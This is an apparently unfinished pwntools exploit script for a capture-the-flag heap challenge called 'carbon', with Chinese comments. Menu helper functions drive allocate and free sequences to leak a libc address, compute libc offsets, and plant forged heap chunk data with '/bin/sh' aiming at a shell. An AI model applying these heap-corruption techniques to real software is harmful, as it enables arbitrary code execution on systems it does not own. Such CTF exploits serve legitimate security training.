#coding:utf-8
from pwn import *
context.log_level = 'debug'

debug = 1

def wpAssign(r, size, believe, data):
	r.recvuntil('> ')
	r.send('1'.ljust(0x10, '\x00'))

	r.recvuntil('What is your prefer size? >')
	r.send(str(size).ljust(0x10, '\x00'))

#如果不是的话，经过一次后就成为，不是可以进行溢出
	r.recvuntil('Are you a believer? >')
	r.send(believe)


	r.recvuntil('Say hello to your new sleeve >')
	r.send(data)	#要么'\n' 要么固定数目


def wpDestroy(r, index):
	r.recvuntil('> ')
	r.send('2')

	r.recvuntil('What is your sleeve ID? >')
	r.send(str(index))

	

def wpTransform(r, index, data):
	r.recvuntil('> ')
	r.send('3')

	r.recvuntil('What is your sleeve ID? >')
	r.send(str(index))


	r.send(data)	

def wpExam(r, index):
	r.recvuntil('> ')
	r.send('4')

	r.recvuntil('What is your sleeve ID? >')
	r.send(str(index))

	return r.recvuntil('Done.\n')[:-len('Done.\n')]


def exp(debug):
	elf = ELF('./carbon')
	if debug == 1:
		r = process('./carbon_no_arlam')
		gdb.attach(r, 'b *0x0000000000400D16')
		lib = ELF('./libc.so')
	else:
		lib = ELF('./libc.so')

	wpAssign(r, 0x1, 'N\n', 'a')	#index:0
	wpAssign(r, 0x48, 'N\n', 'hawk\n')	#index:1
	wpAssign(r, 0x48, 'N\n', 'hawk\n')	#index:2
	wpAssign(r, 0x48, 'N\n', 'hawk\n')	#index:3

	wpDestroy(r, 3)
	wpDestroy(r, 2)
	wpDestroy(r, 1)
	wpDestroy(r, 0)

	wpAssign(r, 0x1, 'N\n', 'a')	#index:0
	address = (u64((wpExam(r, 0)[:6]).ljust(0x8, '\x00')) & 0xffffffffffffff00) + 0x50

	lib_base = address - 0x00007fe167915e50 + 0x7fe167683000

	control = lib_base + 0x7fbea514ee50 - 0x7fbea4ebc000
	first = lib_base + 0x7fbea51513b0 - 0x7fbea4ebc000



	log.info('lib_base => %#x;control => %#x;first => %#x'%(lib_base, control, first))
	
	
	wpAssign(r, 0x48, 'Y\n', '/bin/sh\x00' + p64(0) * 2 + p64(lib_base + 0x10) * 2 + p64(0) + p64(first + 0x30 + 0x8 + 0x10 + 0x8) * 2 + p64(0) * 2 + p64(0x61) + p64(0xbc0) + p64(first + 0x30 + 0x8) * 2 + '\n')	#index:1
	wpAssign(r, 0x48, 'N\n', '/bin/sh\x00\n')	#index:2

	wpDestroy(r, 2)
	wpAssign(r, 0x48, 'N\n', p64(0x60) + p64(lib_base))	#index:2
	#r.interactive()
	

exp(debug)
